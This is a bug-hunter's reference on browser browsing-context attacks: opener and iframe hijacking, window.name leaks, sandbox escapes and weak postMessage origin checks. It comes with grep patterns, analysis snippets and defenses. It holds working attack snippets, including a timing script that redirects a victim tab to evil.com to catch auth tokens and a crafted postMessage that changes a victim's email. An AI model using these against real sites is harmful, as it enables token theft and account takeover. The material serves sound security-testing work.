# Browsing Context Security — Bug Hunting Reference

## Core Concepts

### What Is a Browsing Context?
A browsing context is the environment in which a Document is presented. Each has a WindowProxy, session history, and relationships with other browsing contexts. Types:

- **Top-level** — a tab, no parent
- **Nested** — an iframe/object, has a parent
- **Auxiliary** — a popup via window.open(), has an opener

### Key Relationships
- `window.opener` — reference from popup to the page that opened it
- `window.parent` — reference from iframe to its parent
- `window.top` — reference to the top-level browsing context
- `window.frames[i]` — reference to child iframes
- These relationships are tied to the **browsing context**, not the origin or document. They survive cross-origin navigations.

### Cross-Origin Readable Properties
Even cross-origin, you can:
- Read/write `window.location` (write only — navigate but not read full URL)
- Read `window.frames.length` / `window.length` (frame count — information leak)
- Read `window.closed`
- Read `window.history.length`
- Call `window.postMessage()`
- Check `window.opener !== null`

---

## Attack Patterns

### Attack 1: Opener Hijacking (postMessage Interception)

**Scenario:** Victim page has a button that opens an auth popup. The popup sends sensitive data (token) back to `window.opener` via postMessage.

**Flow:**
1. Attacker page (`evil.com`): `x = window.open("https://victim.com")`
2. User is on `victim.com` in the popup, clicks "Authorize"
3. `victim.com` opens auth popup: `popup = window.open("https://auth-provider.com/authorize")`
4. User authenticates normally in the auth popup
5. **While user is busy authenticating**, attacker navigates the victim tab: `x.location.href = "https://evil.com/catch.html"`
6. The browsing context that WAS `victim.com` is now `evil.com/catch.html` — but the opener relationship from the auth popup still points here
7. Auth popup finishes and does: `window.opener.postMessage(authToken, '*')` → attacker receives the token

**Why it works:** The opener relationship is tied to the browsing context, not the origin. Navigating the page changes the document but the popup's `window.opener` still points to the same browsing context.

**Conditions:**
- No `Cross-Origin-Opener-Policy: same-origin` on victim
- The postMessage uses `'*'` as target origin (if they specify exact origin like `'https://victim.com'`, the browser silently drops the message)

**Side channels to detect when popup opens (to time the navigation):**
- `victim.length` / `victim.frames.length` — frame count changes when auth flow starts
- `victim.history.length` — catches internal navigations
- Focus/blur events — popup creation shifts focus
- Named window probing — if you know the popup name

**Detection/race script:**
```javascript
const victim = window.open('https://victim.com');
let baseFrameCount = null;
let popupDetected = false;

setInterval(() => {
    try {
        const frames = victim.length;
        if (baseFrameCount === null) { baseFrameCount = frames; return; }
        if (frames !== baseFrameCount && !popupDetected) {
            popupDetected = true;
            setTimeout(() => { victim.location = 'https://evil.com/catch.html'; }, 500);
        }
    } catch(e) {}
}, 50);
```

### Attack 2: Child iframe Hijacking

**Scenario:** Victim page iframes a child page. There is trust and communication between parent and child iframe via postMessage.

**Flow:**
1. Victim page (`victim.com`) has: `<iframe src="https://widget.victim.com/dashboard"></iframe>` with bidirectional postMessage communication
2. Attacker page: `x = window.open("https://victim.com")`
3. Attacker navigates the child iframe: `x.frames[0].location.href = "https://evil.com/fake-widget.html"`
4. The victim page's iframe is now `evil.com` but the parent has no idea

**Why cross-origin frame navigation works:** Any page can navigate a frame that is a descendant of a page it opened — this is the "allowed to navigate" algorithm in the spec.

**Two directions of exploitation:**

*Direction 1 — Receive data FROM the parent:*
If the parent does `iframe.contentWindow.postMessage(sensitiveData, '*')`, attacker's injected page receives it.

*Direction 2 — Send data TO the parent:*
If the parent listens for messages from its child, attacker sends crafted messages: `window.parent.postMessage({action: 'updateEmail', email: 'attacker@evil.com'}, '*')`

**Why `e.source` checks don't help:** After hijack, `myIframe.contentWindow` points to the new document (evil.com). `e.source` from attacker's message matches `myIframe.contentWindow` because it IS that iframe's window. Only `e.origin` check is reliable.

### Attack 3: window.name Hijacking

`window.name` persists across navigations within the same browsing context, even cross-origin.

1. Page A (origin X) sets `window.name = "secret_token"`
2. Page A navigates to Page B (origin Y)
3. Page B reads `window.name` → gets `"secret_token"`

**Attack via iframe:**
1. Load victim page in iframe (it sets window.name with sensitive data)
2. Navigate iframe to your origin
3. Read `iframe.contentWindow.name` (now same-origin)

**Data smuggling:** Pass XSS payloads via `window.open('https://target.com/vuln', 'payload_here')` — target reads `window.name`.

### Attack 4: Named Browsing Context Targeting

```html
<iframe name="importantFrame"></iframe>
```
Any page in the frame tree can do: `window.open('https://evil.com', 'importantFrame')` — replaces content of `importantFrame` with attacker content.

### Attack 5: about:blank Origin Inheritance

`about:blank` iframes inherit the creator's origin. An `about:blank` iframe has the parent's origin and can access the parent's DOM. Potential CSP bypass if `about:blank` frame isn't covered.

### Attack 6: Sandbox Escape

`sandbox="allow-scripts allow-same-origin"` is dangerous — iframe can modify the parent DOM and remove its own sandbox attribute. `allow-popups` lets sandboxed content open unsandboxed top-level windows (unless `allow-popups-to-escape-sandbox` is explicitly blocked).

---

## postMessage Fundamentals

- `window.postMessage` is **point-to-point**, not broadcast
- `window.postMessage("data", "*")` sends to **itself only** — listeners on child iframes, parent, or opener do NOT receive it
- The vulnerability with self-messaging is that **anyone with a reference to that window** can also send messages to it
- Who can send postMessage to a window:
  - Opener (`victim = window.open(); victim.postMessage(...)`)
  - Opened page (`window.opener.postMessage(...)`)
  - Parent (`iframe.contentWindow.postMessage(...)`)
  - Child (`window.parent.postMessage(...)`)
  - Sibling frames (`window.top.frames[0].postMessage(...)`)
  - Anything in the frame tree

---

## Static Grepping — What to Search For

Use DevTools → Sources → Ctrl+Shift+F with regex enabled.

### Browsing Context References (communication indicators)
```
(window\.opener|window\.parent|window\.top|\.opener\.|\.parent\.|\.top\.|contentWindow|contentDocument|frames\[|\.frames\.)
```

### Strict version (less noise — only matches with postMessage/location)
```
(window\.opener|window\.parent|window\.top|\.opener\.postMessage|\.opener\.location|\.parent\.postMessage|\.parent\.location|\.top\.postMessage|\.top\.location|contentWindow|contentDocument|frames\[|\.frames\.)
```

### postMessage Surface
```
postMessage
addEventListener("message
addEventListener('message
onmessage
```

### Origin Validation (look for weak patterns)
```
e.origin
event.origin
.origin.indexOf       ← bypassable
.origin.includes      ← bypassable
.origin.startsWith    ← bypassable
.origin.match         ← check if anchored
```

### DOM XSS Sources
```
(location\.search|location\?.search|location\?.hash|location\.hash|location\.href|location\.referrer|location\?.referrer|URLSearchParams|URLSearch\(|\.split\("&"\)|queryParams|\(window.location.href\)|window\.name|location\.hash\.substr\(1\)|\.searchParams|\[\\\\\?\&\])
```

### Quick checklist (five searches that surface 90% of the attack surface)
1. `postMessage` — find all senders and receivers
2. `.origin` — find all origin checks (or lack thereof)
3. `window.opener` — find opener communication
4. `window.parent` — find parent/frame communication
5. `contentWindow` — find iframe access patterns

---

## Dynamic Analysis — Console Snippets

### Find All iframes (including hidden and noscript)
```javascript
const liveIframes = [];
const walkDOM = (root) => {
    root.querySelectorAll('iframe').forEach(f => liveIframes.push(f));
    root.querySelectorAll('*').forEach(el => { if (el.shadowRoot) walkDOM(el.shadowRoot); });
};
walkDOM(document);

const noscriptIframes = [];
document.querySelectorAll('noscript').forEach(ns => {
    const tmp = document.createElement('div');
    tmp.innerHTML = ns.textContent;
    tmp.querySelectorAll('iframe').forEach(f => noscriptIframes.push({
        src: f.getAttribute('src'), name: f.getAttribute('name') || '',
        id: f.getAttribute('id') || '', sandbox: f.getAttribute('sandbox') || 'none',
        context: 'noscript (inactive)'
    }));
});

const rawMatches = [...document.documentElement.outerHTML.matchAll(/<iframe[^>]*>/gi)].map(m => m[0]);

console.log('Live:', liveIframes);
console.log('Noscript:', noscriptIframes);
console.log('Raw HTML:', rawMatches);
```

### Intercept All postMessage Traffic (inject at document-start via Tampermonkey)
```javascript
(function() {
    window.addEventListener('message', (e) => {
        console.log('%c📥 IN', 'color:#4ecdc4;font-weight:bold',
            `origin=${e.origin}`,
            `source=${e.source === window.opener ? 'opener' : e.source === window.parent ? 'parent' : (() => { for (let i=0;i<window.frames.length;i++) if (e.source===window.frames[i]) return 'frames['+i+']'; return 'unknown'; })()}`,
            e.data);
    }, true);

    const origPM = window.postMessage.bind(window);
    window.postMessage = function(msg, origin, transfer) {
        console.log('%c📤 OUT', 'color:#ff6b6b;font-weight:bold', `targetOrigin=${origin}`, msg);
        return origPM(msg, origin, transfer);
    };
})();
```

### Analyze Message Handlers (Chrome DevTools console only)
```javascript
const listeners = getEventListeners(window);
if (listeners.message) {
    listeners.message.forEach((l, i) => {
        const code = l.listener.toString();
        console.group('Handler #' + i);
        if (!code.includes('.origin')) console.warn('❌ NO ORIGIN CHECK');
        else if (code.match(/\.origin\.(includes|indexOf|startsWith)/)) console.warn('⚠️ WEAK ORIGIN CHECK');
        if (code.includes('.source') && !code.includes('.origin')) console.warn('❌ SOURCE CHECK WITHOUT ORIGIN — frame hijack possible');
        const sinks = ['innerHTML','outerHTML','document.write','eval(','Function(','setTimeout(','setInterval(','.src=','.href=','location='];
        const found = sinks.filter(s => code.includes(s));
        if (found.length) console.warn('🔥 SINKS:', found);
        console.log(code.substring(0, 500));
        console.groupEnd();
    });
}
```

---

## Hunting Workflow

1. **Inject hooks** at document-start (Tampermonkey or Local Overrides)
2. **Find all iframes** using the comprehensive finder snippet
3. **Browse the app** — click everything, watch console for postMessage traffic
4. **Grep statically** for postMessage, .origin, window.opener, window.parent, contentWindow
5. **Analyze handlers** — check origin validation, look for dangerous sinks
6. **Test frame hijack** — open page via window.open, try `x.frames[0].location = 'evil.com'`
7. **Check headers** — missing COOP = opener attacks possible, missing X-Frame-Options = frameable
8. **Build exploit** based on what you found

## Exploit Pattern Matching

| Finding | Attack |
|---------|--------|
| Parent sends to iframe with `'*'` | Hijack iframe → receive data |
| Parent listens, no origin check | Hijack iframe → send crafted message |
| Parent listens, uses `e.source` only | Hijack iframe → source check passes |
| Auth popup sends to opener with `'*'` | Navigate opener → receive token |
| Origin check uses `.includes()` | Register lookalike domain |
| `window.name` carries sensitive data | Navigate in same browsing context → read it |
| `sandbox="allow-scripts allow-same-origin"` | Remove own sandbox → full access |
| `allow-popups` without blocking escape | Open unsandboxed popup from sandbox |

## Key Defenses to Check For (Missing = Exploitable)

- `Cross-Origin-Opener-Policy: same-origin` — severs opener relationships
- `Cross-Origin-Embedder-Policy: require-corp` — controls embedding
- `X-Frame-Options: DENY/SAMEORIGIN` — prevents framing
- `rel="noopener"` on links — severs opener on navigation
- Strict `targetOrigin` on postMessage (not `'*'`)
- `e.origin` validation in message handlers (not `e.source`)